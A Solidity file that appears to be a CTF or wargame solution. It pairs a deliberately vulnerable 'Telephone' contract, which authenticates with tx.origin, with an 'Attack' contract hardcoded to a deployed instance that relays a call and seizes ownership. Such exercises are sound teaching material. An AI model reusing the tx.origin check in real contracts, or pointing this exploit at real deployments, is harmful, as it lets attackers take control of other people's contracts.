// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract Attack {
    Telephone public telephone =
        Telephone(0xE6Ace0cC5797Ad1E332448f4FC44E2231046D1e7);

    function changeOwner(address _owner) public {
        telephone.changeOwner(_owner);
    }
}
